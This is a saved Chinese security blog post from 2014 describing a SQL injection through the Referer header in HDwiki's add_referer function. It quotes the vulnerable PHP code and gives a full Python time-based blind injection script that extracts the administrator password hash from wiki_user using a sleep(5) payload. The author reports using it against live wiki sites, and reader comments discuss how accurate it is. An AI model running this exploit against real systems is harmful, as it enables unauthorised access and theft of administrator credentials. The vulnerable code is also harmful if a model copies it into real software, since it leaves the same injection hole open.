@@ -1,0 +1,313 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>HDwiki时间延迟盲注及利用代码 | 离别歌</title>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/styles.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/style.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./HDwiki时间延迟盲注及利用代码  离别歌/jquery.min.js"></script>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/code.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/button.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./HDwiki时间延迟盲注及利用代码  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;text=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;title=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;is_video=false&amp;description=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;title=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;title=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;title=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;title=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/hdwiki-timebase-blind.html&amp;name=HDwiki%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8%E5%8F%8A%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">HDwiki时间延迟盲注及利用代码</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年2月25日 17:20" itemprop="datePublished">
+                    2014 二月 25 17:20
+                </time>
+</div>
+<div class="article-tag">
+            阅读：7523
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/hdwiki">hdwiki</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">注入漏洞</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+<span style="font-size:14px;">    hdwiki某处对referer未做过滤，造成sql注入</span><br>
+<span style="font-size:14px;">    但因为没有输出点，只能做盲注。</span><br>
+<span style="font-size:14px;">    基于时间的盲注脚本已写好，测试可注入出“光明网百科”等百科网站的管理员密码md5值：</span>
+</br></br></p>
+<p>
+<span style="font-size:14px;">    <a href="https://www.leavesongs.com/content/uploadfile/201402/c11b1393323952.jpg" id="ematt:473" target="_blank"><img alt="t01584d474b55919165.jpg" border="0" height="503" src="./HDwiki时间延迟盲注及利用代码  离别歌/c11b1393323952.jpg" title="点击查看原图" width="495"/></a><br/>
+</span>
+</p>
+<p>
+	    <span style="font-size:14px;">在文件/model/user.class.php 第41行add_referer函数：</span>
+</p>
+<p>
+<br/>
+</p>
+<span style="font-size:14px;">
+<pre class="brush: php;auto-links: false;">function add_referer(){
+		if($_SERVER['HTTP_REFERER']){
+			$this-&gt;db-&gt;query("UPDATE ".DB_TABLEPRE."session SET referer ='".$_SERVER['HTTP_REFERER']."' WHERE sid='".base::hgetcookie('sid')."'", '1');
+		}
+	}</pre>
+    直接将$_SERVER[‘HTTP_REFERER’]带入sql语句查询，产生注入。<br/>
+    在/control/user.php文件第108行，dologin函数中调用了add_referer：
+<pre class="brush: php;auto-links: false;">	function dologin(){
+		$_ENV['user']-&gt;passport_server('login','1');
+		if(!isset($this-&gt;post['submit'])){
+			$this-&gt;view-&gt;assign('checkcode',isset($this-&gt;setting['checkcode'])?$this-&gt;setting['checkcode']:0);
+
+			$_ENV['user']-&gt;add_referer();</pre>
+    所以只需要向/index.php?user-login提交POST数据包即可，将注入代码放在REFERER中。<br/>
+利用思路有三：<br/>
+　　01.因为是UPDATE语句，可以直接修改session表，将用户相关权限修改。但后台权限验证在user表中，所以暂时我没找到可利用的方法。<br/>
+　　02.报错注入。但此处执行函数query中，默认是不显示报错信息的，所以也无法利用。<br/>
+　　03.sql盲注，可写一个基于时间的SQL盲注脚本，跑跑管理员的密码。但缺点很明显，因为受到网速的限制（与一些不可预测因素限制），我在本地测试的盲注是可以注入获得正确md5的，但我注入一些网站的时候注入出的md5可能解不出来，也可能有一些偏差。但不可否认的是可以注入获得管理员md5.<br/>
+　　SQL盲注代码：
+<pre class="brush: python;auto-links: false;">　　#!/usr/bin/python
+　　# -*- coding: utf-8 -*-
+　　__author__ = 'Phtih0n'
+　　import requests, sys, time
+　　#####################
+　　#需要你编辑的变量
+　　uid = 2 #你注册用户的uid
+　　url = 'http://localhost/wiki'
+　　#####################
+　　
+　　headers = {
+　　    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 '
+　　                        '(KHTML, like Gecko) Chrome/29.0.1547.66 Safari/537.36 LBBROWSER',
+　　    'Cookie': 'hd_sid=aaaaa',
+　　}
+　　hex = range(48, 57) + range(97, 103)
+　　target = '%s/index.php?user-login' % url
+　　post = {
+　　    'username': 'test',
+　　    'password': 'test',
+　　    'indexlogin': '1'
+　　}
+　　passwd = ""
+　　if __name__ == '__main__':
+　　    for i in range(1, 33):
+　　        clock = []
+　　        for n in hex:
+　　            # requests.get(url, headers = headers)
+　　            headers['Referer'] = "', code=(select if(ord(substring((select password from wiki_user " \
+　　                                 "where uid=1),%d,1))=%d ,sleep(5),0)) where uid=%d#" % (i, n, uid)
+　　            bef = time.clock()
+　　            rep = requests.post(target, data = post, headers = headers, timeout = 2000)
+　　            clock.append(time.clock() - bef)
+　　            if rep.status_code != 200:
+　　                print "网络错误或该网站并不是hdwiki"
+　　                sys.exit(0)
+　　
+　　        # print clock
+　　        pos = clock.index(max(clock))
+　　        passwd += chr(hex[pos])
+　　        print chr(hex[pos])
+　　print "success: %s" % passwd</pre>
+    本脚本依赖python的requests库，该库能使python方便地进行http操作，不安装该脚本会出错。官网地址：http://www.python-requests.org/<br/>
+　　使用脚本前首先注册一枚账号，在用户信息页面获得你的uid，填入上方”uid=”处。因为为了不破坏session表中其他用户字段信息，所以在注入的时候写了一个where从句，所以需要一个uid。<br/>
+　　而且，当session表不存在字段时，也是不能update的，所以注册一个用户，该表就至少有一个字段<br/>
+　　当然实际上该盲注是不需要有用户权限的。 <br/>
+　　建议测试的时候先在本地测试，此时网速对延时盲注的影响较小，我测试的时候基本没有出现错误，注入获得的md5都能解出正确明文。<br/>
+<br/>
+</span>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1708">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./HDwiki时间延迟盲注及利用代码  离别歌/61098ada92da6202c19898f6807f7a0a.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">BORDER</a>
+<time datetime="2014年7月6日 00:55" itemprop="datePublished">
+                            2014 七月 06 00:55
+                        </time>
+<a href="javascript:reply_to('1708', 'BORDER')">回复</a>
+</p>
+<p class="comment-meta">终于遇到个认识的验证码！！感谢博主分享</p>
+</div>
+</div>
+<div class="row" id="comment-1641">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./HDwiki时间延迟盲注及利用代码  离别歌/13c719124b2ff1b1722beca2198ac82f.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://fuck" target="_blank">麦田嫖娼者</a>
+<time datetime="2014年5月26日 18:01" itemprop="datePublished">
+                            2014 五月 26 18:01
+                        </time>
+<a href="javascript:reply_to('1641', '麦田嫖娼者')">回复</a>
+</p>
+<p class="comment-meta">师傅，屌啊，</p>
+</div>
+</div>
+<div class="row" id="comment-1602">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./HDwiki时间延迟盲注及利用代码  离别歌/d615d5793929e8c7d70eab5f00f7f5f1.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">sincoder</a>
+<time datetime="2014年4月14日 11:35" itemprop="datePublished">
+                            2014 四月 14 11:35
+                        </time>
+<a href="javascript:reply_to('1602', 'sincoder')">回复</a>
+</p>
+<p class="comment-meta">代码里那个超时应该判断 &gt; 5  而不是每次取最大的</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1603">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./HDwiki时间延迟盲注及利用代码  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年4月14日 13:35" itemprop="datePublished">
+                            2014 四月 14 13:35
+                        </time>
+<a href="javascript:reply_to('1603', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@sincoder：有时候网速慢会造成多个连接大于5s的情况，所以没这么写。不过除此之外我没想到什么好办法让结果更加准确。。</p>
+</div>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="cf93b8a45f8ac99084adaa89d7931a0fc26afc01"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./HDwiki时间延迟盲注及利用代码  离别歌/cf93b8a45f8ac99084adaa89d7931a0fc26afc01"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="309">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="4yRMIVOapInbjCGhA9NBmamN6YPlYhhaCSciwp0pQvhAjh4woqhlVOoSf2itHL6k"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./HDwiki时间延迟盲注及利用代码  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./HDwiki时间延迟盲注及利用代码  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
